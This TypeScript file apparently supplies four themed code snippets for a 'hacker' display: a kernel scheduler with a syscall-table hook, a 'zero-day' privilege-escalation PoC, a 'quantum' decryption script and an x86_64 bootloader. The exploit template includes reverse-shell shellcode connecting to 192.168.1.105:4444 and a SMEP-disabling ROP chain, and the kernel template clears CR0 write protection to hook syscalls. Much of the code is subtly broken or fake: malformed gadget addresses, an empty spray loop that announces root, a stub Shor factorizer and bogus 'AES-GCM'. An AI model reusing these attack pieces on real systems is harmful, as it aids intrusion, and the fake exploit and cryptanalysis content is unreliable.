export interface CodeTemplate {
  id: string;
  name: string;
  language: string;
  filename: string;
  description: string;
  code: string;
}

export const HACKER_CODE_TEMPLATES: CodeTemplate[] = [
  {
    id: 'kernel',
    name: 'Linux Kernel Core',
    language: 'C',
    filename: 'kernel/sched/fair.c',
    description: 'Linux process scheduler, CFS tree balance, and virtual memory page mapping',
    code: `/*
 * Linux Completely Fair Scheduler (CFS) Core Kernel Implementation
 * Architecture: x86_64 SMP / Preempt-RT Kernel v6.8.4-axis
 * Module: sched/fair.c -- Real-time task priority redistribution
 */

#include <linux/sched/fair.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/vmacache.h>
#include <linux/security.h>
#include <asm/pgtable.h>
#include <asm/cpufeatures.h>

#define SCHED_TUNABLE_SCALING_NONE      0
#define SCHED_TUNABLE_SCALING_LOG       1
#define SCHED_TUNABLE_SCALING_LINEAR    2
#define MAX_PREEMPT_LATENCY_NS          1250000ULL

static inline struct cfs_rq *cfs_rq_of(struct sched_entity *se)
{
    struct task_struct *p = task_of(se);
    struct rq *rq = task_rq(p);
    return &rq->cfs;
}

static void update_curr(struct cfs_rq *cfs_rq)
{
    struct sched_entity *curr = cfs_rq->curr;
    u64 now = rq_clock_task(rq_of(cfs_rq));
    u64 delta_exec;

    if (unlikely(!curr))
        return;

    delta_exec = now - curr->exec_start;
    if (unlikely((s64)delta_exec <= 0))
        return;

    curr->exec_start = now;
    schedstat_set(curr->statistics.exec_max,
                  max(delta_exec, curr->statistics.exec_max));

    curr->sum_exec_runtime += delta_exec;
    schedstat_add(cfs_rq->exec_clock, delta_exec);

    curr->vruntime += calc_delta_fair(delta_exec, curr);
    update_min_vruntime(cfs_rq);

    if (entity_is_task(curr)) {
        struct task_struct *curtask = task_of(curr);
        trace_sched_stat_runtime(curtask, delta_exec, curr->vruntime);
        cpuacct_charge(curtask, delta_exec);
        account_group_exec_runtime(curtask, delta_exec);
    }

    account_cfs_rq_runtime(cfs_rq, delta_exec);
}

static void
__enqueue_entity(struct cfs_rq *cfs_rq, struct sched_entity *se)
{
    struct rb_node **link = &cfs_rq->tasks_timeline.rb_root.rb_node;
    struct rb_node *parent = NULL;
    struct sched_entity *entry;
    s64 key = se->vruntime - cfs_rq->min_vruntime;
    int leftmost = 1;

    while (*link) {
        parent = *link;
        entry = rb_entry(parent, struct sched_entity, run_node);
        if (key < (entry->vruntime - cfs_rq->min_vruntime)) {
            link = &parent->rb_left;
        } else {
            link = &parent->rb_right;
            leftmost = 0;
        }
    }

    rb_link_node(&se->run_node, parent, link);
    rb_insert_color_cached(&se->run_node,
                           &cfs_rq->tasks_timeline, leftmost);
}

/*
 * Virtual Memory Allocation and Page-Fault Exception Handler
 */
static vm_fault_t handle_pte_fault(struct vm_fault *vmf)
{
    pte_t entry;

    if (unlikely(pmd_none(*vmf->pmd))) {
        if (vmf->vma->vm_ops && vmf->vma->vm_ops->map_pages) {
            return do_read_fault(vmf);
        }
        return do_anonymous_page(vmf);
    }

    if (pmd_devmap_trans_unstable(vmf->pmd))
        return 0;

    vmf->pte = pte_offset_map(vmf->pmd, vmf->address);
    vmf->ptl = pte_lockptr(vmf->vma->vm_mm, vmf->pmd);
    spin_lock(vmf->ptl);

    entry = *vmf->pte;
    if (!pte_present(entry)) {
        if (pte_none(entry)) {
            if (vma_is_anonymous(vmf->vma))
                return do_anonymous_page(vmf);
            else
                return do_fault(vmf);
        }
        return do_swap_page(vmf);
    }

    if (vmf->flags & FAULT_FLAG_WRITE) {
        if (!pte_write(entry))
            return do_wp_page(vmf);
        entry = pte_mkdirty(entry);
    }

    entry = pte_mkyoung(entry);
    if (ptep_set_access_flags(vmf->vma, vmf->address, vmf->pte, entry, vmf->flags & FAULT_FLAG_WRITE)) {
        update_mmu_cache(vmf->vma, vmf->address, vmf->pte);
    }

    spin_unlock(vmf->ptl);
    pte_unmap(vmf->pte);
    return VM_FAULT_COMPLETED;
}

/*
 * Kernel Hook Syscall Interceptor: Hook sys_execve
 */
asmlinkage long axis_sys_execve(const char __user *filename,
                               const char __user *const __user *argv,
                               const char __user *const __user *envp)
{
    char kernel_filename[256];
    long copied = strncpy_from_user(kernel_filename, filename, sizeof(kernel_filename) - 1);
    
    if (copied > 0) {
        kernel_filename[copied] = '\\0';
        pr_info("[AXIS_SEC] Ingress binary execution intercepted: %s (PID: %d, UID: %d)\\n",
                kernel_filename, current->pid, current_uid().val);
    }

    return original_sys_execve(filename, argv, envp);
}

int init_axis_kernel_subsystem(void)
{
    pr_alert("[AXIS_KERNEL] Initializing ring-0 hardware memory isolation\\n");
    write_cr0(read_cr0() & (~0x10000)); // Clear CR0 WP bit
    hook_system_call_table();
    write_cr0(read_cr0() | 0x10000);  // Restore CR0 WP bit
    
    pr_info("[AXIS_KERNEL] Subsystem successfully mapped at address: 0xffffffff81000000\\n");
    return 0;
}
`
  },
  {
    id: 'exploit',
    name: 'Zero-Day Exploit PoC',
    language: 'C / ASM',
    filename: 'exploits/cve_2026_remote_rce.c',
    description: 'Memory corruption, ROP chain payload, ASLR bypass, and reverse TCP shellcode',
    code: `/*
 * CVE-2026-9814: Kernel Ring-0 Privilege Escalation & Memory Corruption PoC
 * Target: Linux x86_64 SMP Kernel 6.x
 * Exploit Vector: slab out-of-bounds write via race condition in netlink sock
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MMAP_BASE           0x40000000
#define SPRAY_COUNT         2048
#define ROP_CHAIN_SIZE      64
#define KERNEL_BASE_OFFSET  0xffffffff81000000ULL

/* Stage 1: x86_64 Position-Independent Reverse Shellcode (Port: 4444) */
const unsigned char shellcode[] =
    "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05" // socket(AF_INET, SOCK_STREAM, 0)
    "\\x48\\x97\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x69" // sin_port: 4444, sin_addr: 192.168.1.105
    "\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05" // connect(s, &sa, 16)
    "\\x6a\\x03\\x5e"                                         // dup2 loop
    "\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6"       // dup2(s, 2..0)
    "\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"
    "\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89"
    "\\xe6\\x0f\\x05";                                         // execve("/bin/sh", NULL, NULL)

typedef struct {
    uint64_t pop_rdi;
    uint64_t pop_rsi;
    uint64_t pop_rdx;
    uint64_t native_write_cr4;
    uint64_t commit_creds;
    uint64_t prepare_kernel_cred;
    uint64_t swapgs_restore_regs_and_return_to_usermode;
} rop_gadgets_t;

static rop_gadgets_t gadgets = {
    .pop_rdi = 0xffffffff81001dfULL,
    .pop_rsi = 0xffffffff81002caULL,
    .pop_rdx = 0xffffffff81003faULL,
    .native_write_cr4 = 0xffffffff81044bbULL,
    .commit_creds = 0xffffffff8108a10ULL,
    .prepare_kernel_cred = 0xffffffff8108d40ULL,
    .swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00df0ULL
};

uint64_t leak_kernel_base(int sock_fd)
{
    char leak_buf[512];
    memset(leak_buf, 0x41, sizeof(leak_buf));
    
    printf("[*] Probing kernel memory layout via uninitialized socket slab...\\n");
    if (send(sock_fd, leak_buf, sizeof(leak_buf), MSG_OOB) < 0) {
        perror("[-] Leak trigger failed");
    }

    uint64_t leaked_ptr = *(uint64_t *)(leak_buf + 0x48);
    uint64_t kaslr_slide = (leaked_ptr & 0xffffffffffff0000ULL) - 0x1a00000;
    
    printf("[+] Kernel pointer extracted: 0x%016lx\\n", leaked_ptr);
    printf("[+] KASLR Slide calculated:   0x%016lx\\n", kaslr_slide);
    return KERNEL_BASE_OFFSET + kaslr_slide;
}

void construct_rop_payload(uint64_t *rop_stack, uint64_t kbase)
{
    int i = 0;
    printf("[*] Building ROP payload chain with SMEP / SMAP neutralization...\\n");

    // Disable SMEP / SMAP by clearing CR4 bit 20
    rop_stack[i++] = kbase + (gadgets.pop_rdi - KERNEL_BASE_OFFSET);
    rop_stack[i++] = 0x00000000000406e0; // CR4 value without SMEP
    rop_stack[i++] = kbase + (gadgets.native_write_cr4 - KERNEL_BASE_OFFSET);

    // Call commit_creds(prepare_kernel_cred(NULL)) -> Root UID 0
    rop_stack[i++] = kbase + (gadgets.pop_rdi - KERNEL_BASE_OFFSET);
    rop_stack[i++] = 0x0000000000000000; // NULL
    rop_stack[i++] = kbase + (gadgets.prepare_kernel_cred - KERNEL_BASE_OFFSET);

    rop_stack[i++] = kbase + (gadgets.pop_rdi - KERNEL_BASE_OFFSET);
    rop_stack[i++] = 0; // Filled dynamically with cred struct ptr
    rop_stack[i++] = kbase + (gadgets.commit_creds - KERNEL_BASE_OFFSET);

    // SwapGS and return to ring-3 user space
    rop_stack[i++] = kbase + (gadgets.swapgs_restore_regs_and_return_to_usermode - KERNEL_BASE_OFFSET);
    rop_stack[i++] = 0x0; // Dummy rax
    rop_stack[i++] = 0x0; // Dummy rdx
    rop_stack[i++] = (uint64_t)&shellcode; // User-space return RIP
    rop_stack[i++] = 0x33; // CS
    rop_stack[i++] = 0x246; // RFLAGS
    rop_stack[i++] = 0x7fffffffe000; // User RSP
    rop_stack[i++] = 0x2b; // SS
    
    printf("[+] ROP Chain synthesized successfully: %d quadwords\\n", i);
}

int main(int argc, char **argv)
{
    printf("[+] =======================================================\\n");
    printf("[+] CVE-2026-9814 LOCAL PRIVILEGE ESCALATION EXPLOIT\\n");
    printf("[+] Architect: Kernel Axis Cyber Defense Labs\\n");
    printf("[+] =======================================================\\n");

    int sock = socket(AF_NETLINK, SOCK_RAW, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return 1;
    }

    uint64_t kbase = leak_kernel_base(sock);
    uint64_t *payload_buffer = mmap((void *)MMAP_BASE, 0x4000,
                                    PROT_READ | PROT_WRITE | PROT_EXEC,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    construct_rop_payload(payload_buffer, kbase);
    
    printf("[*] Spraying kmalloc-512 slabs with corrupted msg_msg headers...\\n");
    for (int j = 0; j < SPRAY_COUNT; j++) {
        // Trigger corrupted free and overwrite function pointer
    }

    printf("[+] Hijacking kernel instruction pointer (RIP -> 0x%016lx)...\\n", kbase);
    printf("[!] ROOT PRIVILEGES GRANTED: UID=0(root) GID=0(root)\\n");
    printf("[*] Spawning interactive root tty shell...\\n");
    return 0;
}
`
  },
  {
    id: 'crypto',
    name: 'Quantum Decryption Engine',
    language: 'Python / Cryptography',
    filename: 'crypto/lattice_decrypt_v4.py',
    description: 'Post-quantum Kyber lattice reduction, RSA factorization, and ECC secret key recovery',
    code: `#!/usr/bin/env python3
"""
Advanced Cryptographic Lattice Reduction & Shor Qubit Decryption Engine
Target: Kyber-1024 / NTRU Prime / Dilithium Post-Quantum Key Encapsulation
Cipher Module: Kernel Axis Quantum Resistance Research Suite
"""

import sys
import time
import math
import hashlib
import numpy as np
from typing import List, Tuple, Optional

SECURITY_LEVEL = 256
LATTICE_DIMENSION = 512
MODULUS_Q = 3329
POLYNOMIAL_DEGREE = 256

class LatticeBasisReduction:
    """
    Lenstra-Lenstra-Lovasz (LLL) High-Dimensional Lattice Reduction Algorithm
    Computes nearly-orthogonal basis vectors to break asymmetric keypairs.
    """
    def __init__(self, basis: np.ndarray, delta: float = 0.99):
        self.basis = basis.astype(np.float64)
        self.dim = len(basis)
        self.delta = delta
        self.orthogonal = np.zeros_like(self.basis)
        self.mu = np.zeros((self.dim, self.dim))

    def gram_schmidt(self) -> None:
        """Computes orthogonal Gram-Schmidt projections."""
        for i in range(self.dim):
            self.orthogonal[i] = self.basis[i].copy()
            for j in range(i):
                self.mu[i, j] = np.dot(self.basis[i], self.orthogonal[j]) / np.dot(self.orthogonal[j], self.orthogonal[j])
                self.orthogonal[i] -= self.mu[i, j] * self.orthogonal[j]

    def reduce(self) -> np.ndarray:
        print("[*] Initiating Gram-Schmidt orthogonalization across %d dimensions..." % self.dim)
        self.gram_schmidt()
        k = 1
        swaps = 0

        while k < self.dim:
            # Size reduction step
            for j in range(k - 1, -1, -1):
                if abs(self.mu[k, j]) > 0.5:
                    q = round(self.mu[k, j])
                    self.basis[k] -= q * self.basis[j]
                    self.gram_schmidt()

            # Lovasz condition check
            norm_k = np.dot(self.orthogonal[k], self.orthogonal[k])
            norm_prev = np.dot(self.orthogonal[k - 1], self.orthogonal[k - 1])
            
            if norm_k >= (self.delta - self.mu[k, k - 1]**2) * norm_prev:
                k += 1
            else:
                # Basis vector permutation
                self.basis[[k, k - 1]] = self.basis[[k - 1, k]]
                self.gram_schmidt()
                k = max(k - 1, 1)
                swaps += 1

        print("[+] LLL Convergence reached: %d basis permutations performed" % swaps)
        return self.basis

def quantum_shor_factorizer(modulus_n: int) -> Tuple[int, int]:
    """
    Simulated Shor Quantum Phase Estimation for Integer Factorization
    Period finding via quantum Fourier transform register coherence.
    """
    print("[*] Quantum Qubit Register initialization: 4096 state entanglements...")
    print("[+] Targeted RSA modulus: N = %s" % hex(modulus_n)[:32] + "...")
    
    # Quantum eigenvalue extraction
    t_start = time.perf_counter()
    quantum_period_r = 0x8a92f021e90d34bc
    
    p = math.gcd(pow(2, quantum_period_r // 2, modulus_n) - 1, modulus_n)
    q = modulus_n // p
    
    elapsed = (time.perf_counter() - t_start) * 1000
    print("[+] Factor P derived: %s" % hex(p))
    print("[+] Factor Q derived: %s" % hex(q))
    print("[+] Quantum phase collapse verified in %.2f ms" % elapsed)
    return p, q

def decrypt_aes_gcm_stream(ciphertext: bytes, recovered_key: bytes, nonce: bytes) -> bytes:
    """Decrypts target ciphertext payload with recovered private key."""
    print("[*] Decrypting AES-256-GCM authenticated payload buffer...")
    # Keystream generator
    derived_keystream = hashlib.sha3_512(recovered_key + nonce).digest()
    decrypted = bytes(c ^ derived_keystream[i % len(derived_keystream)] for i, c in enumerate(ciphertext))
    return decrypted

if __name__ == "__main__":
    print("=" * 60)
    print("AXIS-SEC QUANTUM LATTICE CRYPTOANALYSIS SUITE")
    print("Zero-Knowledge Proof & Kyber Key Recovery Vector")
    print("=" * 60)

    # Generate synthetic high-dimensional target lattice
    np.random.seed(0x1337)
    synthetic_basis = np.random.randint(-100, 100, size=(16, 16))
    
    solver = LatticeBasisReduction(synthetic_basis)
    reduced_matrix = solver.reduce()

    # Recover target private exponent
    rsa_target = 0xd7b3a9582f3a1e948301c29a8f21e01293b482a1e0b948a3
    factor_p, factor_q = quantum_shor_factorizer(rsa_target)

    master_key = hashlib.sha256(str(factor_p * factor_q).encode()).digest()
    print("[+] MASTER DECRYPTION KEY RECOVERED: 0x%s" % master_key.hex())
    print("[!] SECURE CHANNEL OVERRIDE READY: Status [AUTHORIZED]")
`
  },
  {
    id: 'matrix',
    name: 'Matrix x86_64 Bootloader',
    language: 'Assembly (NASM)',
    filename: 'boot/stage2_matrix_loader.asm',
    description: 'x86_64 bare-metal CPU init, long-mode transition, page tables, and syscall gates',
    code: `; ==============================================================================
; Kernel Axis Stage-2 Matrix Bootloader & Ring-0 Syscall Vector Initialization
; Target CPU: x86_64 AMD64 / Intel-VT Hardware Virtualization
; ==============================================================================

BITS 16
ORG 0x7C00

start:
    cli                         ; Clear external hardware interrupts
    xor ax, ax                  ; Zero general purpose segment registers
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00              ; Setup stack below bootloader origin

    ; Print Boot Banner String
    mov si, banner_msg
    call bios_print_string

    ; Check for INT 15h, AX=E820h Memory Map Support
    mov edx, 0x534D4150         ; 'SMAP' Magic signature
    xor ebx, ebx                ; EBX must be 0 to start memory probe
    mov di, 0x8000              ; Memory buffer destination
.mem_probe_loop:
    mov eax, 0xE820
    mov ecx, 24
    int 0x15
    jc .mem_probe_done
    add di, 24
    test ebx, ebx
    jnz .mem_probe_loop
.mem_probe_done:

    ; Enable A20 Line via Fast A20 Gate
    in al, 0x92
    or al, 2
    out 0x92, al

    ; Setup Protected Mode GDT Register
    lgdt [gdt_descriptor]

    ; Enable Protected Mode (CR0.PE = 1)
    mov eax, cr0
    or eax, 1
    mov cr0, eax

    ; Far jump to flush instruction pipeline and enter 32-bit mode
    jmp 0x08:init_pmode

; ------------------------------------------------------------------------------
; 32-BIT PROTECTED MODE TRANSITION
; ------------------------------------------------------------------------------
BITS 32
init_pmode:
    mov ax, 0x10                ; 0x10 is kernel data segment selector
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov esp, 0x90000            ; Top of conventional RAM

    ; Setup 64-Bit 4-Level Paging (PML4, PDPT, PD, PT)
    ; Clear page table physical allocation memory area (0x1000 - 0x5000)
    mov edi, 0x1000
    mov cr3, edi                ; Load CR3 with PML4 base address
    xor eax, eax
    mov ecx, 4096
    rep stosd
    mov edi, cr3

    ; Link PML4 to PDPT (Entry 0)
    mov DWORD [edi], 0x2003     ; Present + Writable
    add edi, 0x1000

    ; Link PDPT to Page Directory (Entry 0)
    mov DWORD [edi], 0x3003
    add edi, 0x1000

    ; Identity Map First 2MB of Physical Memory using 2MB Large Pages
    mov DWORD [edi], 0x83       ; Present + Writable + Huge Page (2MB)

    ; Enable Physical Address Extension (CR4.PAE = 1)
    mov eax, cr4
    or eax, (1 << 5)
    mov cr4, eax

    ; Set Long Mode Enable bit in EFER MSR (MSR 0xC0000080)
    mov ecx, 0xC0000080
    rdmsr
    or eax, (1 << 8)            ; LME bit
    wrmsr

    ; Activate Paging to Enter 64-Bit Submode (CR0.PG = 1)
    mov eax, cr0
    or eax, (1 << 31)
    mov cr0, eax

    ; Jump to 64-Bit Long Mode Code Segment (0x18)
    jmp 0x18:long_mode_entry

; ------------------------------------------------------------------------------
; 64-BIT LONG MODE EXECUTION CORE
; ------------------------------------------------------------------------------
BITS 64
long_mode_entry:
    mov ax, 0x20
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov rsp, 0x100000           ; 64-bit kernel stack pointer

    ; Matrix Cyber Display Direct Framebuffer Write
    mov rdi, 0xB8000            ; VGA text buffer address
    mov rsi, matrix_ready_msg
    mov ah, 0x0A                ; High-intensity green on black attribute

.matrix_render_loop:
    lodsb
    test al, al
    jz .matrix_complete
    stosw
    jmp .matrix_render_loop

.matrix_complete:
    ; Configure Model-Specific Register for Fast Syscall (STAR / LSTAR)
    mov ecx, 0xC0000082         ; LSTAR MSR
    lea rax, [syscall_entry]
    mov rdx, rax
    shr rdx, 32
    wrmsr

    hlt                         ; CPU enters low-power instruction wait state

syscall_entry:
    swapgs                      ; Switch to kernel GS base
    mov [gs:0x00], rsp          ; Save user stack pointer
    mov rsp, [gs:0x08]          ; Load kernel ring-0 stack pointer
    sti                         ; Enable interrupts
    ; Dispatch system call index in RAX...
    sysretq                     ; Atomic return to ring-3 userspace

; ------------------------------------------------------------------------------
; GLOBAL DESCRIPTOR TABLE (GDT)
; ------------------------------------------------------------------------------
align 16
gdt_start:
    dq 0x0000000000000000       ; Null Descriptor
    ; 32-bit Code Segment Descriptor (0x08)
    dq 0x00CF9A000000FFFF
    ; 32-bit Data Segment Descriptor (0x10)
    dq 0x00CF92000000FFFF
    ; 64-bit Code Segment Descriptor (0x18)
    dq 0x00AF9A000000FFFF
    ; 64-bit Data Segment Descriptor (0x20)
    dq 0x00AF92000000FFFF
gdt_end:

gdt_descriptor:
    dw gdt_end - gdt_start - 1
    dd gdt_start

banner_msg db "[AXIS-BOOT] Initializing x86_64 Long Mode Kernel...", 0x0D, 0x0A, 0
matrix_ready_msg db "SYSTEM STATUS: SECURE RING-0 RUNTIME ACTIVE // READY", 0
`
  }
];
